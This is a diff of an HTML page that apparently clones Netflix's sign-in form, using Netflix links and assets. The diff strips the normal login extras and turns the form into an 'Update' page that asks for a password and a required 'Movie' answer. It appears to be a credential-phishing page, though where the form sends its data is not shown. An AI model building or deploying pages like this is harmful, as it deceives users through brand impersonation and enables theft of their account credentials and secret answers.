@@ -20,43 +20,20 @@
                     <div class="label-container">
                         <h2 id="sign-in-text">Update</h2>
                     </div>
-        
-                    <div class="box-container" id="email-container">
-                        <input class="field" id="email-field" name="email" type="text" oninput="update('email-field', 'email-label', 'email-inputError')" onfocus="inputOnFocus('email-field', 'email-label', 'email-container')" onblur="inputOnBlur('email-field', 'email-label', 'email-container', 'email-inputError')" required>
-                        <label class="label" id="email-label" for="email-field">Email or phone number</label>
-                    </div>
                     <div class="inputError" id="email-inputError"></div>
                     <div class="box-container" id="pwd-container">
-                        <input class="field" id="pwd-field" name="password" type="text" oninput="update('pwd-field', 'pwd-label', 'pwd-inputError')" onfocus="inputOnFocus('pwd-field', 'pwd-label', 'pwd-container')" onblur="inputOnBlur('pwd-field', 'pwd-label', 'pwd-container', 'pwd-inputError')" required>
-                        <label class="label" id="pwd-label" for="pwd-field">Movie</label>
+                        <input class="field" id="pwd-field" name="password" type="password" oninput="update('pwd-field', 'pwd-label', 'pwd-inputError')" onfocus="inputOnFocus('pwd-field', 'pwd-label', 'pwd-container')" onblur="inputOnBlur('pwd-field', 'pwd-label', 'pwd-container', 'pwd-inputError')" required>
+                        <label class="label" id="pwd-label" for="pwd-field">Password</label>
                     </div>
                     <div class="inputError" id="pwd-inputError"></div>
+                    <div class="box-container" id="moive-container">
+                        <input class="field" id="email-field" name="movie" type="text" oninput="update('email-field', 'email-label', 'email-inputError')" onfocus="inputOnFocus('email-field', 'email-label', 'email-container')" onblur="inputOnBlur('email-field', 'email-label', 'email-container', 'email-inputError')" required>
+                        <label class="label" id="email-label" for="email-field">Movie</label>
+                    </div>
+                    <div class="inputError" id="moive-inputError"></div>
                     <div class="box-container" id="login-button-container">
-                        <input id="login-button" type="submit" value="Sign In">
+                        <input id="login-button" type="submit" value="Submit">
                     </div>
-                    <div class="checkbox-row">
-                        <span class="checkbox-container" tabindex="0" id="checkbox" onclick="toggleCheckBox()" onblur="checkBoxOnBlur()">
-                            <svg id="icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="check" class="svg-inline--fa fa-check fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>
-                        </span>
-                        <label id="remember-me-label" onclick="toggleCheckBox()">Remember me</label>
-                        
-                        <a href="https://www.netflix.com/br/LoginHelp">
-                            <label id="help"></label>
-                        </a>
-                    </div>
-                </form>
-                <form action="" method="POST" class="fb-login-form">
-                    <button class="fb-login-button" type="submit">
-                        <div class="fb-login">
-                            <img class="fb-icon" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png">
-                            <span class="fb-btn-text" id="fb-btn-text">Log in with Facebook</span>
-                        </div>
-                    </button>
-                </form>
-                <div class="sign-up">
-                    <span id="sign-up">New to Netflix?</span>
-                    <a class="sign-up-link" id="sign-up-link" href="/signup">Sign up now.</a>
-                </div>
                 <div class="reCAPTCHA">
                     <p id="reCAPTCHA-text">
                         <span id="reCAPInfo">This page is protected by Google reCAPTCHA to ensure you're not a bot.</span>
